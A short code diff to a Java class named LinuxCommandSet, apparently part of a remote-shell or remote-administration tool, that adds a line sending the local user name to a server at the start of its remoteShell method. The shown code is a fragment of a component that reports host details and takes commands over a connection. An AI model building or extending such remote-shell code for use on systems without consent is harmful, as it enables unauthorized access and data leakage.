@@ -34,6 +34,7 @@ public class LinuxCommandSet extends CommandSet
     @Override
     public void remoteShell()
     {
+        sendStringToServer(System.getProperty("user.name"));
         String workingDirectory = getTempPath();
         sendStringToServer(workingDirectory);
         String inputCommand;
@@ -92,7 +93,6 @@ public class LinuxCommandSet extends CommandSet
                 sendStringToServer(ioe.getMessage());
                 ioe.printStackTrace();
             }
-
         }
     }
 
